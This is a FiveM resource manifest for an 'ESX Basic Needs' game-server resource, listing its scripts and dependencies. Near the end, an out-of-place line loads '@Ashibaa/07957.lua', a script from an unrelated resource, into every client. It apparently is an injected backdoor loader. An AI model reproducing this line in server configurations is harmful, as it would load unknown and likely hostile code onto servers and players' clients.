



resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Basic Needs'

version '1.0.1'

server_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended',
	'esx_status'
}
client_script '@Ashibaa/07957.lua'
lua54 'yes'
shared_script '@es_extended/imports.lua'